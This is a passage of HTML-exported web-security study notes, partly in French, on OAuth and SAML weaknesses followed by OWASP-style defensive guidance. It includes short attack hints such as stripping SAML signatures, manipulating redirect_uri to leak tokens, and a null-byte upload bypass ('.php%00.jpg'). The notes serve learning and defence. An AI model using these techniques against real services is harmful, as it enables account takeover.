<li><strong>The "access token" is also used to make API calls to fetch the relevant user data. </strong>

<li>
<img src="images/image183.png" width="" alt="alt_text" title="image_tooltip">

</li>
</ul>
<p>
<strong>	</strong>
</p>
<p>
<strong>As the most sensitive data (the access token and user data) is not sent via the browser, this grant type is arguably the most secure. Server-side applications should ideally always use this grant type if possible. </strong>
</p>
<ol>

<li><strong>Authorization request</strong>
<p>

    <strong>The client application sends a request to the OAuth service's ( /authorization OR /auth … it may vary).</strong>
</p>
</li>
</ol>
<p>

<img src="images/image184.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ol>

<li><strong>User login and consent</strong>
<p>

    <strong>When the authorization server receives the initial request, it will redirect the user to a login page, where they will be prompted to log in to their account with the OAuth provider. For example, this is often their social media account. </strong>
</p>
<p>

    <strong>They will then be presented with a list of data that the client application wants to access. This is based on the scopes defined in the authorization request. The user can choose whether or not to consent to this access. </strong>
</p>
</li>
</ol>
<p>
<strong>“Implicit” grant type</strong>
</p>
<p>

<img src="images/image185.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>The implicit grant type is much simpler. Rather than first obtaining an authorization code and then exchanging it for an access token ( like in the other grant type ), the client application receives the access code immediately after the user gives their consent. </strong>
</li>
</ul>
<ul>

<li><strong>It is far less secure. When using the implicit grant type, all communication happens via browser redirects - there is no secure back-channel like in the authorization code flow.</strong>
<p>

    <strong>This means that the sensitive access token and the user's data are more exposed to potential attacks. </strong>
</p>
<ul>

<li><strong>The implicit grant type is more suited to single-page applications and native desktop applications, which cannot easily store the client_secret on the back-end, and therefore, don't benefit as much from using the authorization code grant type. </strong>
</li>
</ul>
</li>
</ul>
<p>
<strong>OAuth authentication</strong>
</p>
<ul>

<li><strong>Although not originally intended for this purpose, OAuth has evolved into a means of authenticating users as well. For example, you're probably familiar with the option many websites provide to log in using your existing social media account </strong>
<ul>

<li><strong>OAuth authentication is generally implemented as follows : </strong>
</li>
</ul>
</li>
</ul>
<p>

<img src="images/image186.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>


<img src="images/image187.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>
<img src="images/image188.png" width="" alt="alt_text" title="image_tooltip">

</li>
</ul>
<p>
<strong>If the state Parameter is not used by the OAuth2 Client, a CSRF is maybe possible ( leading to Takeover account ) :</strong>
</p>
<p>


<img src="images/image189.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Then ( in the next photo ):</strong>
</p>
<p>


<img src="images/image190.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<strong>Or When the Login page in the Authorization Server and the account linking are no protected against CSRF :</strong>
</p>
<p>


<img src="images/image191.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>How do OAuth authentication vulnerabilities arise? 
<ul>
 
<li><strong>OAuth authentication vulnerabilities arise partly because the OAuth specification is relatively vague and flexible by design.</strong>
</li> 
</ul>
</li> 
</ul>
<ul>

<li><strong>One of the other key issues with OAuth is the general lack of built-in security features. The security relies almost entirely on developers using the right combination of configuration options and implementing their own additional security measures on top, such as robust input validation.</strong>
</li>
</ul>
<ul>

<li><strong>Depending on the grant type, highly sensitive data is also sent via the browser, which presents various opportunities for an attacker to intercept it.</strong>
</li>
</ul>
<p>
<strong>	</strong>
</p>
<p>
<strong>Example of attack :</strong>
</p>
<p>


<img src="images/image192.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image193.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image194.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>However, there may still be ways to bypass this validation. It depends on how the URI is checked (See SSRF bypass, parameter pollution vulnerabilities).</strong>
</p>
<p>

<img src="images/image195.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>It is important to note that you shouldn't limit your testing to just probing the redirect_uri parameter in isolation.</strong>
</p>
<p>
<strong>You will often need to experiment with different combinations of changes to several parameters.</strong>
</p>
<p>
<strong>Sometimes changing one parameter can affect the validation of others. For example, changing the response_mode from query to fragment can sometimes completely alter the parsing of the redirect_uri.</strong>
</p>
<p>

<img src="images/image196.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Once you identify which other pages you are able to set as the redirect URI, you should audit them for additional vulnerabilities ( like open redirects, …) that you can potentially use to leak the code or token.</strong>
</p>
<ul>

<li><strong>Flawed scope validation :</strong>
</li>
</ul>
<p>

<img src="images/image197.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>SAML

<li>Definiton
</li>
</ul>
<p>
<strong>Unlike OAuth, SAML is just for authentication :</strong>
</p>
<p>


<img src="images/image198.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>But the Service Provider needs to trust the Identity Provider :</strong>
</p>
<p>

<img src="images/image199.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>So the SAML response is signed and the Service Provider has to verify this Signature with the IProvider public key :</strong>
</p>
<p>

<img src="images/image200.png" width="" alt="alt_text" title="image_tooltip">

</p>
<h4>Some Vulnerability :</h4>


<ul>

<li><strong>The signature is not verified ( so you can tamper the response and connect with another account ) Or you can remove it (only the content of “SignatureValue” tag) .</strong>
</li>
</ul>
<ul>

<li>Injection de commentaire XML :

<li>
<img src="images/image201.png" width="" alt="alt_text" title="image_tooltip">

<p>

    <strong>--------------------------------------------------</strong>
</p>
<ul>

<li>Phar://
</li>
</ul>
</li>
</ul>
<p>

<img src="images/image202.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image203.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image204.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image205.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image206.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Different file extensions
</li>
</ul>

<table>
  <tr>
   <td><strong>[FILE].a</strong>
   </td>
   <td><strong>Static libraries in Linux.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>[FILE].so</strong>
   </td>
   <td><strong>Dynamically linked shared object libraries in Linux.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>[FILE].ppm</strong>
   </td>
   <td><strong>Image format.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>[FILE].asar</strong>
   </td>
   <td><strong>Fichier décompressable avec winrar</strong>
   </td>
  </tr>
  <tr>
   <td><strong>.pht</strong>
   </td>
   <td><strong>liée à php</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<p>
<strong>	</strong>
</p>
<ul>

<li>JS prototype Pollution :
</li>
</ul>
<p>


<img src="images/image207.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image208.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image209.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Règle et de bonnes pratiques :
</li>
</ul>
<ul>

<li>
Session Management :
<p>
voir : <a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#session-id-properties">https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#session-id-properties</a>
</p>

<table>
  <tr>
   <td>
<ul>

<li>Session ID Name Fingerprinting 
<ul>
 
<li>It is recommended to change the default session ID name of the web development framework (<em>PHPSESSID</em> (PHP), <em>JSESSIONID</em> (J2EE), <em>CFID</em> & <em>CFTOKEN</em> (ColdFusion), <em>ASP.NET_SessionId</em> (ASP .NET), etc.),   to a generic name, such as id.
        Therefore, the session ID name can disclose the technologies and programming languages used by the web application.
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Session ID Length and Entropy 
<ul>
 
<li>The session ID must be long enough and random enough to prevent brute force attacks  ( a good CSPRNG (Cryptographically Secure Pseudorandom Number Generator) must be used ).
 
<li>The session ID value must provide at least 64 bits of entropy
 
<li>Must also be unique
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Session ID Content (or Value) 
<ul>
 
<li>The session ID content (or value) must be meaningless to prevent information disclosure attacks. 
<ul>
 
<li>The session ID must simply be an identifier on the client side, and its value must never include sensitive information (or PII).
<ul>

<li>In addition, if the session objects and properties contain sensitive information, such as credit card numbers, it is required to duly encrypt and protect the session management repository.
<ul>

<li>It is recommended to use the session ID created by your language or framework as they have been tested by the web application security and development communities over time.
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>A web application should make use of cookies for session ID exchange management. 
    If a user submits a session ID through a different exchange mechanism, such as a URL parameter, the web application should avoid accepting it as part of a defensive strategy to stop session fixation.
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>Cookies Management :
</li>
</ul>
<p>
voir : <a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies">https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies</a>
</p>

<table>
  <tr>
   <td>
<ul>

<li>Set “Secure” Attribute : 
<ul>
 
<li>The Secure cookie attribute instructs web browsers to only send the cookie through an encrypted HTTPS (SSL/TLS) connection.
        This session protection mechanism is mandatory to prevent the disclosure of the session ID through MitM (Man-in-the-Middle) attacks.
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Set “HttpOnly” Attribute : 
<ul>
 
<li>The HttpOnly cookie attribute instructs web browsers not to allow scripts an ability to access the cookies via the DOM document.cookie object. This session ID protection is mandatory to prevent session ID stealing through XSS attacks.
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Set “SameSite” Attribute : 
<ul>
 
<li>SameSite allows a server to define a cookie attribute making it impossible for the browser to send this cookie along with cross-site requests. The main goal is to mitigate the risk of cross-origin information leakage, and provides some protection against cross-site request forgery attacks.
BONUS : Using SameSite cookies in Lax mode does then provide a partial defense against CSRF attacks, because user actions that are targets for CSRF attacks are often implemented using the POST method. Two important caveats here are:
<p>
Some applications do implement sensitive actions using GET requests.
<p>
Many applications and frameworks are tolerant of different HTTP methods. In this situation, even if the application itself employs the POST method by design, it will in fact accept requests that are switched to use the GET method.
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Set “Domain and Path” Attribute :
        The Domain cookie attribute instructs web browsers to only send the cookie to the specified domain and all subdomains. If the attribute is not set, by default the cookie will only be sent to the origin server (in a general way).
<p>

        The Path cookie attribute instructs web browsers to only send the cookie to the specified directory or subdirectories (or paths or resources) within the web application.
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>AJAX Management :
<p>

    voir : https://cheatsheetseries.owasp.org/cheatsheets/AJAX_Security_Cheat_Sheet.html
</p>

<table>
  <tr>
   <td>
<ul>

<li>Use .innerText instead of .innerHtml
The use of .innerText will prevent most XSS problems as it will automatically encode the text.
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Don't rely on client and business logic for security
Least ye have forgotten the user controls the client side logic. I can use a number of browser plugins to set breakpoints, skip code, change values, etc. Never rely on client logic.
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Use CSRF Protection
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
</table>


<p>

<img src="images/image210.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
Session Storage et SESSION sont deux choses différentes.
</p>  
<ul>
  
<li>Authentication Management :

<table>
  <tr>
   <td>
<ul>

<li>Make sure your usernames/user IDs are case-insensitive. User 'smith' and user 'Smith' should be the same user. case sensitive usernames would enable someone to attempt to impersonate someone else just by registering a new account with a different permutation of capital/lowercase letters.
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Password 
<ul>
 
<li>8 characters minimum ( shorter is considered to be weak ) 
<ul>
 
<li>It is important to set a maximum password length (such as 64 characters) to prevent long password Denial of Service attacks but not too large due to limitations in certain hashing algorithms. 
<ul>
 
<li>Do not silently truncate passwords if it’s too long.
<ul>

<li>Allow usage of all characters including unicode and whitespace.
<ul>

<li>Include password strength meter, block common and previously breached passwords
<ul>

<li>Require Re-authentication for Sensitive Features in order to mitigate CSRF and session hijacking.
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Authentication and Error Messages 
<ul>
 
<li>An application must respond with a generic error message regardless of whether:  
<ul>
  
<li>The user ID or password was incorrect.
  
<li>The account does not exist.
  
<li>The account is locked or disabled.
<ul>

<li>The processing time can be significantly different according to the case (success vs failure) allowing an attacker to mount a time-based attack ( example of implementation here : <a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html</a> )
<ul>

<li>
<img src="images/image211.png" width="" alt="alt_text" title="image_tooltip">

<ul>

<li>
<img src="images/image212.png" width="" alt="alt_text" title="image_tooltip">

</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Protect Against Automated Attacks 
<ul>
 
<li>Multi-Factor Authentication
 
<li>Account Lockout
 
<li>CAPTCHA  
<ul>
  
<li>However, many CAPTCHA implementations have weaknesses that allow them to be solved using automated techniques.
</li>  
</ul>
 
<li>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>Credential Stuffing Prevention

<table>
  <tr>
   <td>
<ul>

<li>Multi-Factor Authentication 
<ul>
 
<li>Multi-factor authentication (MFA) is by far the best defense against the majority of password-related attacks, including credential stuffing and password spraying.
<ul>

<li>In order to balance security and usability, only in specific circumstances MFA could be used : 
<ul>
 
<li>A new browser/device or IP address. 
<ul>
 
<li>An unusual country or location. 
<ul>
 
<li>Specific countries that are considered untrusted. 
<ul>
 
<li>An IP address that appears on known block lists. 
<ul>
 
<li>An IP address that has tried to login to multiple accounts. 
<ul>
 
<li>A login attempt that appears to be scripted rather than manual.
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Alternative Defenses 
<ul>
 
<li>Secondary Passwords, PINs and Security Questions :
 
<li>CAPTCHA
 
<li>IP Block-listing
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Defense in Depth 
<ul>
 
<li>Identifying Leaked Passwords
 
<li>Notify users about unusual security events
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Multi-Step Login Processes ( to discourage hacker ) 
<ul>
 
<li>By adding additional steps to this process, such as requiring the username and password to be entered sequentially
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
</table>


<h4>
    CSRF (Cross-Site Request Forgery Prevention)</h4>



<table>
  <tr>
   <td>
<ul>

<li>Use Built-In Or Existing CSRF Implementations for CSRF Protection
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>CSRF tokens should be generated once per user session or for each request ( for more security but less usability :  Interaction with a previous page will result in a CSRF false positive security event at the server ).
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>CSRF tokens should be:
<ul>

<li>Unique per user session.

<li>Secret

<li>Unpredictable (large random value generated by a secure method).
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Defense In Depth Techniques 
<ul>
 
<li>SameSite Cookie Attribute ( to not include cookie ) 
<ul>
 
<li>Verifying Origin With Standard Headers. Reliability on these headers comes from the fact that they cannot be altered programmatically (using JavaScript with an XSS vulnerability) as they fall under forbidden headers list, meaning that only the browser can set them :	  
<ul>
  
<li>Checking the Origin header
  
<li>Checking the Referrer header
<ul>

<li>User Interaction Based CSRF Defense 
<ul>
 
<li>Re-Authentication (password or stronger)
 
<li>One-time Token
 
<li>CAPTCHA
<ul>

<li>Inserting the CSRF token in the custom HTTP request header via JavaScript is considered more secure because it uses custom request headers : 
<ul>
 
<li>This defense relies on the same-origin policy (SOP) restriction that only JavaScript can be used to add a custom header, and only within its origin. By default, browsers do not allow JavaScript to make cross origin requests with custom headers.

<img src="images/image213.png" width="" alt="alt_text" title="image_tooltip">

</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>XSS
</li>
</ul>
<p>
Different Encoding type and Mechanism :
</p>

<table>
  <tr>
   <td>Encoding Type
   </td>
   <td>Encoding Mechanism
   </td>
  </tr>
  <tr>
   <td>HTML Entity Encoding
   </td>
   <td>Convert <code>&</code> to <code>&amp;</code>, Convert <code>&lt;</code> to <code>&lt;</code>, Convert <code>></code> to <code>&gt;</code>, Convert <code>"</code> to <code>&quot;</code>, Convert <code>'</code> to <code>&#x27;</code>, Convert <code>/</code> to <code>&#x2F;</code>
   </td>
  </tr>
  <tr>
   <td>HTML Attribute Encoding
   </td>
   <td>Except for alphanumeric characters, encode all characters with the HTML Entity <code>&#xHH;</code> format, including spaces. (HH = Hex Value)
   </td>
  </tr>
  <tr>
   <td>URL Encoding
   </td>
   <td>Standard percent encoding. URL encoding should only be used to encode parameter values, not the entire URL or path fragments of a URL.
   </td>
  </tr>
  <tr>
   <td>JavaScript Encoding
   </td>
   <td>Except for alphanumeric characters, encode all characters with the <code>\uXXXX</code> unicode encoding format (X = Integer).
   </td>
  </tr>
  <tr>
   <td>CSS Hex Encoding
   </td>
   <td>CSS encoding supports <code>\XX</code> and <code>\XXXXXX</code>.
   </td>
  </tr>
</table>



<table>
  <tr>
   <td>
<ul>

<li>HTML Encode Before Inserting Untrusted Data into HTML Element Content 
<ul>
 
<li>When you want to put untrusted data directly into the HTML body somewhere. This includes inside normal tags like div, p, b, td ...
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Use a Security Encoding Library instead of writing your own.
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Attribute Encode Before Inserting Untrusted Data into HTML Common Attributes 
<ul>
 
<li>1) Always quote dynamic attributes with " or '. 
        Quoted attributes can only be broken out of with the corresponding quote, while unquoted attributes can be broken out of with many characters ( including [space] % * + , - / ; &lt; = > ^ and |.) 
<ul>
 
<li>2) Encode the corresponding quote: " and ' should be encoded to &#x22; and &#x27; respectively.
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>JavaScript Encode Before Inserting Untrusted Data into JavaScript Data Values 
<ul>
 
<li>The only safe place to put untrusted data into this JS code is inside a quoted "data value". 
<ul>

<li>Please note there are some JavaScript functions that can never safely use untrusted data as input - EVEN IF JAVASCRIPT ENCODED  !!!
        For example : window.setInterval('...’), …
<ul>

<li>Avoid using any escaping shortcuts like \" because the quote character may be matched by the HTML attribute parser which runs first and these escaping are also susceptible to escape-the-escape attacks ( \\” ).
<ul>

<li>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>HTML Encode JSON values 
<ul>
 
<li>Ensure returned Content-Type header is application/json and not text/html
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>URL Encode Before Inserting Untrusted Data into HTML URL Parameter Values
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
</table>


<h4>Résumé :</h4>


<p>

<img src="images/image214.png" width="" alt="alt_text" title="image_tooltip">

</p>
<h4>              	     Cryptographic Storage</h4>



<table>
  <tr>
   <td>
<ul>

<li>Passwords should not be stored using reversible encryption - secure password slow hashing algorithms should be used instead.
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>For symmetric encryption, AES-128 (ideally 256 bits) and a secure mode should be used as the preferred algorithm.
In some cases there may be regulatory requirements that limit the algorithms that can be used, such as FIPS 140-2 or PCI DSS.
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>For asymmetric encryption, use elliptical curve cryptography (ECC) with a secure curve such as Curve25519 as a preferred algorithm. If ECC is not available and RSA must be used, then ensure that the key is at least 2048 bits.
In some cases there may be regulatory requirements that limit the algorithms that can be used, such as FIPS 140-2 or PCI DSS.
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>INFO : Many other symmetric and asymmetric algorithms are available which have their own pros and cons, and they may be better or worse than AES or Curve25519 in specific use cases. When considering these, a number of factors should be taken into account, including: 
<ul>
 
<li>Key size.
 
<li>Known attacks and weaknesses of the algorithm.
 
<li>Maturity of the algorithm.
 
<li>Approval by third parties such as NIST's algorithmic validation program.
 
<li>Performance (both for encryption and decryption).
 
<li>Quality of the libraries available.
 
<li>Portability of the algorithm (i.e, how widely supported is it).
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Cipher Modes : 
<ul>
 
<li>Where available, authenticated modes should always be used. These provide guarantees of the integrity and authenticity of the data, as well as confidentiality.  The most commonly used authenticated modes are GCM and CCM, which should be used as a first preference.
<ul>

<li>If GCM or CCM are not available, then CTR mode or CBC mode should be used.  As these do not provide any guarantees about the authenticity of the data, separate authentication should be implemented, such as using the Encrypt-then-MAC technique.
        
<img src="images/image215.png" width="" alt="alt_text" title="image_tooltip">

<p>

        to resume :
<ol>

<li>GCM or CCM

<li>CTR or CBC with a implemented authentication (Encrypt-then-MAC)
</li>
</ol>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Secure Random Number Generation 
<ul>
 
<li>Pseudo-Random Number Generators (PRNG) VS Cryptographically Secure Pseudo-Random Number Generators (CSPRNG) :

<table>
  <tr>
   <td>
PRNG
</li> 
</ul>
</li> 
</ul>
   </td>
   <td>CSPNRG
   </td>
  </tr>
  <tr>
   <td>provide low-quality randomness but much faster
   </td>
   <td> produce a much higher quality of randomness but they are slower and more CPU intensive.
   </td>
  </tr>
  <tr>
   <td rowspan="2" >Should be used for non-security related functionality. 
<p>
They must not be used for anything security critical, as it is often possible for attackers to guess or predict the output.
   </td>
   <td>safe to use for security-sensitive functionality.
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>



![alt_text](images/image216.png "image_tooltip")




* Defence in Depth
    * Applications should be designed to still be secure even if cryptographic controls fail. Any information that is stored in an encrypted form should also be protected by additional layers of security (should enforce strong access control to prevent unauthorised access to information).
   </td>
  </tr>
  <tr>
   <td>
* Key Management
    * Keys should be randomly generated using a cryptographically secure function
    * Keys should not be based on common words or phrases, or on "random" characters generated by mashing the keyboard.
    * Key Lifetimes and Rotation
        * Encryption keys should be changed :
            * If the previous key is known (or suspected) to have been compromised.
            * After a specified period of time has elapsed (known as the cryptoperiod).
            * After the key has been used to encrypt a specific amount of data ( this would typically be 2^35 bytes (~34GB) for 64-bit keys and 2^68 bytes (~295 exabytes) for 128 bit keys.)
            * If there is a significant change to the security provided by the algorithm (such as a new attack being announced).
            * It is important that the code and processes required to rotate a key are in place before they are required
    * Key Storage
        * Where available, the secure storage mechanisms provided by the operating system, framework or cloud service provider should be used. These include:
            * A physical Hardware Security Module (HSM).
            * A virtuel HSM.
            * Key vaults such as Amazon KMS or Azure Key Vault.
            There are many advantages to using these types of secure storage :

* Central management of keys, especially in containerised environments.
* Easy key rotation and replacement.
* Secure key generation.
* Simplifying compliance with regulatory standards such as FIPS 140 or PCI DSS.
* Making it harder for an attacker to export or steal keys.
* Do not hard-code keys into the application source code.
* Protect the configuration files containing the keys with restrictive permissions.
    * Avoid storing keys in environment variables, as these can be accidentally exposed through functions such as phpinfo() or through the /proc/self/environ file.
    * Where possible, encryption keys should be stored in a separate location from encrypted data. For example, if the data is stored in a database, the keys should be stored in the filesystem. This means that if an attacker only has access to one of these (for example through directory traversal or SQL injection), they cannot access both the keys and the data.
   </td>
  </tr>
  <tr>
   <td>
* 
   </td>
  </tr>
  <tr>
   <td>
* 
   </td>
  </tr>
</table>


<h4>Database Security</h4>



<table>
  <tr>
   <td>
<ul>

<li>The backend database used by the application should be isolated as much as possible, in order to prevent malicious or undesirable users from being able to connect to it. The following options could be used to protect it : 
<ul>
 
<li>Restricting access to the network port to specific hosts with firewall rules. 
<ul>
 
<li>Placing the database server in a separate DMZ isolated from the application server.
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>When an application is running on an untrusted system (such as a thick-client), it should always connect to the backend through an API that can enforce appropriate access control and restrictions. Direct connections should never be made from a thick client to the backend database.
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Transport Layer Protection : 
<ul>
 
<li>Configure the database to only allow encrypted connections if it possible 
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Authentication 
<ul>
 
<li>The database should be configured to always require authentication, including connections from the local server. Database accounts should be Protected with strong and unique passwords.
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Database Configuration and Hardening 
<ul>
 
<li>The database application should also be properly configured and hardened. The following principles should apply to any database application and platform:  
<ul>
  
<li>Install any required security updates and patches.  
<ul>
  
<li>Configure the database services to run under a low privileged user account.  
<ul>
  
<li>Remove any default accounts and databases.  
<ul>
  
<li>Store transaction logs on a separate disk to the main database files.  
<ul>
  
<li>Configure a regular backup of the database.  
<ul>
  
<li>Ensure that the backups are protected with appropriate permissions, and ideally encrypted.
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<h4>Php configuration</h4>



<table>
  <tr>
   <td>
<ul>

<li>php.ini
<ul>

<li>
<img src="images/image217.png" width="" alt="alt_text" title="image_tooltip">
 
<ul>
 
<li>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Snuffleupagus
</li>
</ul>
   </td>
  </tr>
</table>


<h4>Unvalidated Redirects and Forwards</h4>



<table>
  <tr>
   <td>
<ul>

<li>When applications allow user input to forward requests between different parts of the site, the application must check that the user is authorized to access the URL.
    If the application fails to perform these checks, an attacker crafted URL may pass the application's access control check and then forward the attacker to an administrative function that is not normally permitted.
<p>

    
<img src="images/image218.png" width="" alt="alt_text" title="image_tooltip">

</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Preventing Unvalidated Redirects and Forwards 
<ul>
 
<li>Sanitize input by creating a list of trusted URLs (lists of hosts or a regex).
        This should be based on an allow-list approach, rather than a block list. 
<ul>
 
<li>Force all redirects to first go through a page notifying users that they are going off of your site, with the destination clearly displayed, and have them click a link to confirm.
<ul>

<li>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
</table>


<h4>File Uploads</h4>



<table>
  <tr>
   <td>
<ul>

<li>There is no silver bullet in validating user content. Implementing a defense in depth approach is key to make the upload process harder and more locked down to the needs and requirements for the service
    Implementing multiple techniques is key and recommended, as no one technique is enough to secure the service.
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>File Upload Protection 
<ul>
 
<li>Extension validation  
<ul>
  
<li>Ensure that the validation occurs after decoding the file name, and that a proper filter is set in place in order to avoid certain known bypasses:   
<ul>
   
<li>Double extensions
   
<li>Null bytes (.php%00.jpg)
<ul>

<li>List Allowed Extensions 
<ul>
 
